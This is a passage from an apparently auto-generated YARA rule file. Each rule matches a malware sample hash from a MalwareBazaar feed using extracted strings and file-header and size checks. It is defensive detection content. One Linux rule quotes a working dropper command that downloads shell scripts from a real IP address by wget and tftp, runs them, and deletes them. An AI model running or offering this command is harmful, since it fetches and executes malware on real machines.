        $s11 = "ValueMap::CreateItem"
        $s12 = "ValueMap::CreateValueMapItem"
        $s13 = "ValueMap::SetXml"
        $s14 = "ValueMap::GetXml"
        $s15 = "Dispatch<struct IValueMap>::GetIDsOfNames"
        $s16 = "Dispatch<struct IValueMap>::GetTypeInfo"
        $s17 = "Dispatch<struct IValueMapItem>::GetIDsOfNames"
        $s18 = "Dispatch<struct IValueMapItem>::GetTypeInfo"
        $s19 = "PPTP00_AlertDataCollector::get_AlertThresholds"
        $s20 = "_AlertDataCollector::get_EnglishAlertThresholds"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1516KB and
        all of them
}

rule Windows_f8ab78e1db3a3cc3793f7680a90dc1d8ce087226ef59950b7acd6bb1beffd6e3
{
    meta:
        description = "Auto ML: f8ab78e1db3a3cc3793f7680a90dc1d8ce087226ef59950b7acd6bb1beffd6e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "ios_base::failbit set"
        $s7 = "ios_base::eofbit set"
        $s8 = "ios_base::badbit set"
        $s9 = "map/set too long"
        $s10 = "text file busy"
        $s11 = "no such file or directory"
        $s12 = "GetDateFormatEx"
        $s13 = "GetTimeFormatEx"
        $s14 = "EnumSystemLocalesEx"
        $s15 = "GetLocaleInfoEx"
        $s16 = "connection reset"
        $s17 = "network reset"
        $s18 = "not a socket"
        $s19 = "file exists"
        $s20 = "connection already in progress"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 24033KB and
        all of them
}

rule Windows_f8b626d638c4f7dad13330557c49b148a42a54e8d96da1767c6b413c653ec445
{
    meta:
        description = "Auto ML: f8b626d638c4f7dad13330557c49b148a42a54e8d96da1767c6b413c653ec445"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "pUSER32.dll"
        $s6 = "WINMM.dll"
        $s7 = "oledlg.dll"
        $s8 = "sEty"
        $s9 = "getW"
        $s10 = "OLEAUT32.dll"
        $s11 = "+qWINSPOOL.DRV"
        $s12 = "ADVAPI32.dll"
        $s13 = "LoadLibraryA"
        $s14 = "~COMCTL32.dll"
        $s15 = "ShellExecuteA"
        $s16 = "midiStreamClose"
        $s17 = "ExitProcess"
        $s18 = "user32.dll"
        $s19 = "GetModuleFileNameA"
        $s20 = "OpenPrinterA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1988KB and
        all of them
}

rule Windows_f90db97e56f2eb46d2e55a0cd7674997bbc2d644f6370b477fd04edfca7b9cdd
{
    meta:
        description = "Auto ML: f90db97e56f2eb46d2e55a0cd7674997bbc2d644f6370b477fd04edfca7b9cdd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ReadUInt32"
        $s5 = "ReadInt32"
        $s6 = "ReadUInt64"
        $s7 = "ReadInt64"
        $s8 = "ReadUInt16"
        $s9 = "ReadInt16"
        $s10 = "System.IO"
        $s11 = "System.Data"
        $s12 = "GetObjectData"
        $s13 = "System.Runtime.Remoting.Metadata"
        $s14 = "System.Collections.Generic"
        $s15 = "get_CanRead"
        $s16 = "Thread"
        $s17 = "GetOrAdd"
        $s18 = "GetUpperBound"
        $s19 = "GetLowerBound"
        $s20 = "CreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 446KB and
        all of them
}

rule Windows_f91f15faf187ed674aa20ad34350fdac00123db350bbb0e37993f1e15dc68009
{
    meta:
        description = "Auto ML: f91f15faf187ed674aa20ad34350fdac00123db350bbb0e37993f1e15dc68009"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Linux_f9269e614fa9f50bf9eb222daa97686ffc71018793d4cd84606ebf415ea4cd0f
{
    meta:
        description = "Auto ML: f9269e614fa9f50bf9eb222daa97686ffc71018793d4cd84606ebf415ea4cd0f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<l>=)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 15KB and
        all of them
}

rule Windows_f94a12e629297139c866ad2396dc2d14bfb3f6ec51fcbb723cdb0e2c65e3fbcb
{
    meta:
        description = "Auto ML: f94a12e629297139c866ad2396dc2d14bfb3f6ec51fcbb723cdb0e2c65e3fbcb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "msimg32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB and
        all of them
}

rule Windows_f95b01b35d47756420ec9c626d56865c687323473b11e51f141277c746db03a0
{
    meta:
        description = "Auto ML: f95b01b35d47756420ec9c626d56865c687323473b11e51f141277c746db03a0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB and
        all of them
}

rule Windows_f9743731cc0fd40863f11c5c6568f9412a5c3df75a3628a6df275b70b95afe08
{
    meta:
        description = "Auto ML: f9743731cc0fd40863f11c5c6568f9412a5c3df75a3628a6df275b70b95afe08"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GameSettingsForm_Load_1"
        $s5 = "get_Item1"
        $s6 = "get_Player1"
        $s7 = "get_Item2"
        $s8 = "get_Player2"
        $s9 = "<Module>"
        $s10 = "getInstancia"
        $s11 = "get_paginaWebEmpresa"
        $s12 = "set_paginaWebEmpresa"
        $s13 = "get_razonSocialEmpresa"
        $s14 = "set_razonSocialEmpresa"
        $s15 = "get_direccionEmpresa"
        $s16 = "set_direccionEmpresa"
        $s17 = "get_correoEmpresa"
        $s18 = "set_correoEmpresa"
        $s19 = "get_telefonoEmpresa"
        $s20 = "set_telefonoEmpresa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 696KB and
        all of them
}

rule Windows_f98cf9ee6e3f42fe35ec570b4728ecd65929ba24ba4c090c3b438c8de4677cc8
{
    meta:
        description = "Auto ML: f98cf9ee6e3f42fe35ec570b4728ecd65929ba24ba4c090c3b438c8de4677cc8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ablast.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "IGMPMessageType"
        $s8 = "System.Collections"
        $s9 = "System.Collections.ObjectModel"
        $s10 = "SystemName"
        $s11 = "SystemDescription"
        $s12 = "SystemCapabilities"
        $s13 = "System.Security.Cryptography"
        $s14 = "System.Collections.Generic"
        $s15 = "System.IO"
        $s16 = "System.Resources"
        $s17 = "System.Globalization"
        $s18 = "System.Text"
        $s19 = "payloadPacketOrData"
        $s20 = "SerialRealTimeCommunicationSystemIii"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1529KB and
        all of them
}

rule Windows_17c7cc079465da191a8ed1512b8088b869415f5bc5bccf3eb72b0820b7f35619
{
    meta:
        description = "Auto ML: 17c7cc079465da191a8ed1512b8088b869415f5bc5bccf3eb72b0820b7f35619"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 428KB and
        all of them
}

rule Windows_f999d7af5fe48ff638c89bd5e726b42e89c1db97fc6563977523b506f96f05c8
{
    meta:
        description = "Auto ML: f999d7af5fe48ff638c89bd5e726b42e89c1db97fc6563977523b506f96f05c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "cj_fileing_cab_1"
        $s7 = "kset_crashbarrier09"
        $s8 = "cj_fileing_cab_2"
        $s9 = "bkn_templine01"
        $s10 = "bkn_templomiplc"
        $s11 = "bkn_wi3_wincovs"
        $s12 = "laundry_17x6_shell"
        $s13 = "laundry_shell_lod"
        $s14 = "cj_handset_one"
        $s15 = "new_kitchen_shell"
        $s16 = "new_mansion_shell"
        $s17 = "ld_brc_winb_01"
        $s18 = "ld_fact_glass_win"
        $s19 = "nhospintwind03"
        $s20 = "ld_lobby_win_00"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1546KB and
        all of them
}

rule Windows_f9aa5c8b66fdab9dad594bf1b84aa90193efe5e5c4317f76118dd2e06b6202ae
{
    meta:
        description = "Auto ML: f9aa5c8b66fdab9dad594bf1b84aa90193efe5e5c4317f76118dd2e06b6202ae"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2287KB and
        all of them
}

rule Windows_fa102af99cc8e8cf91b02a251eb099637bba2112944c29896c0d40653bd7fe8d
{
    meta:
        description = "Auto ML: fa102af99cc8e8cf91b02a251eb099637bba2112944c29896c0d40653bd7fe8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "map/set too long"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2397KB and
        all of them
}

rule Windows_fa146cfe8c5719a3b2f0cd36f32334956da9fe4eb83aabc0a2ad6e88dd33b430
{
    meta:
        description = "Auto ML: fa146cfe8c5719a3b2f0cd36f32334956da9fe4eb83aabc0a2ad6e88dd33b430"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 560KB and
        all of them
}

rule Windows_faa08b9df237134013697a74026442e00ee185b8c8025f37e87238ecf5e2dc27
{
    meta:
        description = "Auto ML: faa08b9df237134013697a74026442e00ee185b8c8025f37e87238ecf5e2dc27"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "D$vLoad"
        $s6 = "D$gLoad"
        $s7 = "D$ winm"
        $s8 = "wine"
        $s9 = ";fileu"
        $s10 = "9file"
        $s11 = "9windu"
        $s12 = ":windu"
        $s13 = "open"
        $s14 = ":fileu"
        $s15 = ";fileup"
        $s16 = "8fileu"
        $s17 = "?fileu("
        $s18 = "8windu"
        $s19 = "load"
        $s20 = "9httptD"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 14512KB and
        all of them
}

rule Windows_fab4d0b0d8e57ed2e88b7336bce24982ac1d0095a750e43a8725342d38efd5fb
{
    meta:
        description = "Auto ML: fab4d0b0d8e57ed2e88b7336bce24982ac1d0095a750e43a8725342d38efd5fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s7 = "GetTempPath2W"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1672KB and
        all of them
}

rule Windows_fabb2f61d079f431599bc61ab386291dbe3da947531024e25b1737b6e7084c92
{
    meta:
        description = "Auto ML: fabb2f61d079f431599bc61ab386291dbe3da947531024e25b1737b6e7084c92"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "IReadOnlyCollection`1"
        $s5 = "ISet`1"
        $s6 = "HashSet`1"
        $s7 = "IReadOnlyList`1"
        $s8 = "get_Item1"
        $s9 = "System.IConvertible.ToUInt32"
        $s10 = "ReadInt32"
        $s11 = "System.IConvertible.ToInt32"
        $s12 = "ReadAsInt32"
        $s13 = "IReadOnlyDictionary`2"
        $s14 = "get_Item2"
        $s15 = "System.IConvertible.ToUInt64"
        $s16 = "ReadInt64"
        $s17 = "System.IConvertible.ToInt64"
        $s18 = "ReadUInt16"
        $s19 = "System.IConvertible.ToUInt16"
        $s20 = "System.IConvertible.ToInt16"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1011KB and
        all of them
}

rule Windows_fad4ad2b20d69fe58683c50e3f69e0278c37eae9f12cf81e44243a146361c082
{
    meta:
        description = "Auto ML: fad4ad2b20d69fe58683c50e3f69e0278c37eae9f12cf81e44243a146361c082"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 255KB and
        all of them
}

rule Linux_fae68a88bda7f46c1d4d4f4a02992b85a025017aabc6d4d3f153cd3e101a8fb3
{
    meta:
        description = "Auto ML: fae68a88bda7f46c1d4d4f4a02992b85a025017aabc6d4d3f153cd3e101a8fb3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "user"
        $s3 = "User"
        $s4 = "shell"
        $s5 = "system"
        $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s7 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s9 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s11 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s12 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s13 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s14 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s15 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s18 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s19 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s20 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 114KB and
        all of them
}

rule Windows_faf860a503e3988eae118fcce67a6c37aa321bf9c6dd450e0fe641b8ca68a3e2
{
    meta:
        description = "Auto ML: faf860a503e3988eae118fcce67a6c37aa321bf9c6dd450e0fe641b8ca68a3e2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "CorExitProcess"
        $s4 = "mscoree.dll"
        $s5 = "An application has made an attempt to load the C runtime library incorrectly."
        $s6 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s7 = "- Attempt to initialize the CRT more than once."
        $s8 = "- unable to open console device"
        $s9 = "- unexpected multithread lock error"
        $s10 = "- not enough space for thread data"
        $s11 = "- floating point not loaded"
        $s12 = "KERNEL32.DLL"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "kernel32.dll"
        $s16 = "GetProcessWindowStation"
        $s17 = "GetUserObjectInformationA"
        $s18 = "GetLastActivePopup"
        $s19 = "GetActiveWindow"
        $s20 = "USER32.DLL"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 173KB and
        all of them
}

rule Windows_17eb1a2f794ad5e02a0d96fcbd42fcfe328eb4a10bdda74d8e5cb1dfc46e4fa6
{
    meta:
        description = "Auto ML: 17eb1a2f794ad5e02a0d96fcbd42fcfe328eb4a10bdda74d8e5cb1dfc46e4fa6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rsrc"
        $s3 = "Windows"
        $s4 = "TModulepw3"
        $s5 = "HTTP!"
        $s6 = "TEmpty"
        $s7 = "TTemp"
        $s8 = "type=\"win32\""
        $s9 = "name=\"Microsoft.Windows.Common-Controls\""
        $s10 = "processorArchitecture=\"*\"/>"
        $s11 = "advapi32.dll"
        $s12 = "comctl32.dll"
        $s13 = "KERNEL32.DLL"
        $s14 = "msimg32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "user32.dll"
        $s17 = "version.dll"
        $s18 = "RegCloseKey"
        $s19 = "ExitProcess"
        $s20 = "GetProcAddress"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1565KB and
        all of them
}

rule Windows_fb0cedd17622c47554bc9fada82b2135838059aae5fa17ead92ab3fd222cfab5
{
    meta:
        description = "Auto ML: fb0cedd17622c47554bc9fada82b2135838059aae5fa17ead92ab3fd222cfab5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Microsoft.Win32"
        $s5 = "<Module>"
        $s6 = "ES_SYSTEM_REQUIRED"
        $s7 = "System.IO"
        $s8 = "wbpYMfQqjbaSEttmaKijCaybPbECUYWWlpnERVgCBzuX"
        $s9 = "xACCOPenRnxtGjTeDVoCtFqymGmuLuFmQkgJuLcaeuhhcTUHULOcPRuRieniDLExJiEucjKRToyY"
        $s10 = "System.Collections.Generic"
        $s11 = "Thread"
        $s12 = "Load"
        $s13 = "get_ExitCode"
        $s14 = "set_Mode"
        $s15 = "get_Message"
        $s16 = "get_Handle"
        $s17 = "GetModuleHandle"
        $s18 = "get_MainWindowHandle"
        $s19 = "File"
        $s20 = "WindowsBuiltInRole"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 465KB and
        all of them
}

rule Linux_fb159c44bf12ac8f6f4b253973072935e7e463b626aaa45c8813b30f6b77fa8a
{
    meta:
        description = "Auto ML: fb159c44bf12ac8f6f4b253973072935e7e463b626aaa45c8813b30f6b77fa8a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 85KB and
        all of them
}

rule Windows_fb4f050b02bffd952b6b8ea9bb0409fd203f620bf2a5b6a3327b934beaf10721
{
    meta:
        description = "Auto ML: fb4f050b02bffd952b6b8ea9bb0409fd203f620bf2a5b6a3327b934beaf10721"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_GEnum0_0"
        $s5 = "set_GEnum0_0"
        $s6 = "get_Enum8_0"
        $s7 = "set_Enum8_0"
        $s8 = "get_Nullable_0"
        $s9 = "get_Double_0"
        $s10 = "get_DateTime_0"
        $s11 = "set_DateTime_0"
        $s12 = "get_Encoding_0"
        $s13 = "set_Encoding_0"
        $s14 = "get_String_0"
        $s15 = "get_Stream_0"
        $s16 = "get_Boolean_0"
        $s17 = "set_Boolean_0"
        $s18 = "get_Version_0"
        $s19 = "get_ICollection_0"
        $s20 = "fileInfo_0"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1556KB and
        all of them
}

rule Windows_fb51a9757a36a6d6d98d63546d481ebc0156947b859b12afb3b4afe612e06db9
{
    meta:
        description = "Auto ML: fb51a9757a36a6d6d98d63546d481ebc0156947b859b12afb3b4afe612e06db9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_fb631c667cdf59c841076c9bc2c4a55e4de46a5bdaf45d73842597808877dda1
{
    meta:
        description = "Auto ML: fb631c667cdf59c841076c9bc2c4a55e4de46a5bdaf45d73842597808877dda1"
